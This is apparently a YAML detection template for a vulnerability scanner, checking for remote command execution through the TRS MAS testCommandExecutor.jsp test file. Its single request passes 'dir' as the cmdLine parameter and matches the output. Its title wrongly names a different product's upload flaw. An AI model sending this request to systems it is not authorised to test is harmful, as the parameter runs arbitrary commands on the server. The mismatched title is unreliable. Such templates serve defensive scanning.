id: max-test-command-executor-rce

info:
  name: 紫光档案管理系统 upload.html 后台文件上传漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    拓尔思 MAS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限
    "MAS媒资管理系统登录页面"
  
rules:
  r0:
    request:
      method: GET
      path: /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv=
    expression: response.status == 200 && response.body.ibcontains(b'D:\TRS\TRSMAS\')
expression: r0()
